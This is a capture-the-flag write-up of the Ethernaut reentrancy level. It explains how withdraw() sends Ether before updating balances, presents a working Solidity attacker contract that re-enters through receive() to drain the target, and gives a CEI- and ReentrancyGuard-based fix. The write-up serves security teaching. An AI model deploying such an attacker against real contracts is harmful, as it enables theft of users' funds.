---
title: 'Ethernaut - Reentrancy'
description: 'Exploiting classic reentrancy vulnerabilities. Learn how state modification sequence and unchecked external calls can lead to total contract draining.'
date: 2025-07-10
tags: ['solidity', 'security', 'reentrancy', 'flash-loan', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 🌀 Reentrancy - The Recursion Thief

## Challenge Overview

The objective of this level is to **steal all the funds** from the `Reentrance` smart contract.

**The Catch:** The contract implements balance tracking via user donations and allows players to withdraw only what they have donated. We must find a way to withdraw our funds recursively before the contract updates our balance.

---

## Technical Analysis

### Vulnerability: Classic Reentrancy (State Modification Order)

The `withdraw()` function in `Reentrance.sol` contains a major state-updating flaw:

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        // [VULNERABILITY] External call executed before state update
        (bool result,) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        // State update performed post-execution
        balances[msg.sender] -= _amount;
    }
}
```

#### The Root Cause
This is a textbook **reentrancy** vulnerability:
1. **Unsafe Call Execution**: The contract transfers Ether to `msg.sender` using `.call{value: ...}("")`. Unlike `.transfer()`, `.call()` forwards all remaining gas, allowing the recipient contract to execute complex logic.
2. **Delayed Accounting**: The contract only subtracts the withdrawn `_amount` from `balances[msg.sender]` **after** the external call completes successfully.
3. **Recursive Re-entry**: A malicious contract can intercept the Ether transfer inside its `receive()` function and immediately call `withdraw()` again. Because `balances[msg.sender]` has not yet been decremented, the `if (balances[msg.sender] >= _amount)` check will pass again, leading to recursive withdrawals.

---

## The Exploit: The Multi-Step Solution

1. **Deploy an Attack Contract**: Deploy an exploit contract with a `receive()` function designed to re-enter `Reentrance.withdraw()`.
2. **Seed the Attack**: Donate a small amount (e.g., `0.01 ETH`) to the target contract under the attacker contract's address using `donate()`.
3. **Trigger the Reentrancy Loop**: Initiate the first `withdraw()` call.
4. **Recursion Drains the Vault**: When the target sends the Ether, the attack contract's `receive()` function executes and re-enters `withdraw()` continuously until the target contract is completely drained.

---

## Proof of Concept (PoC)

Below is the Solidity exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentrancyAttacker {
    IReentrance public immutable target;
    uint256 public constant donationAmount = 0.01 ether;

    constructor(address _target) public {
        target = IReentrance(_target);
    }

    // Call this function with at least 0.01 ETH to seed the exploit
    function attack() external payable {
        require(msg.value >= donationAmount, "Not enough seed ETH");

        // 1. Donate to our own contract's record
        target.donate{value: donationAmount}(address(this));

        // 2. Initiate the first withdraw call
        target.withdraw(donationAmount);
    }

    // 3. Receive function triggers the reentrancy recursion
    receive() external payable {
        // Calculate remaining target balance
        uint256 targetBalance = address(target).balance;
        
        if (targetBalance > 0) {
            // Withdraw either our contribution amount or the remaining balance
            uint256 amountToWithdraw = targetBalance < donationAmount ? targetBalance : donationAmount;
            target.withdraw(amountToWithdraw);
        }
    }
}
```

---

## Auditor's Lessons

1. **Checks-Effects-Interactions (CEI) Pattern**: Always update all local state variables (Effects) before interacting with external contracts (Interactions). This guarantees that any re-entrant call will read updated state variables.
2. **Use Reentrancy Guards**: Implement a standard mutex lock (such as OpenZeppelin's `ReentrancyGuard` or a custom `nonReentrant` modifier) to prevent recursive function execution.
3. **Limit Forwarded Gas**: Be cautious with `.call()` when sending native currencies, as it forwards all available gas. Ensure it is protected by the CEI pattern or guards.

---

## Remediation

Implement the CEI pattern and apply a reentrancy guard:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SecureReentrance is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    // Apply the nonReentrant modifier to block recursion
    function withdraw(uint256 _amount) public nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // 1. Effects: Update the state first
        balances[msg.sender] -= _amount;

        // 2. Interactions: Execute the external call
        (bool result, ) = msg.sender.call{value: _amount}("");
        require(result, "Transfer failed");
    }
}
```
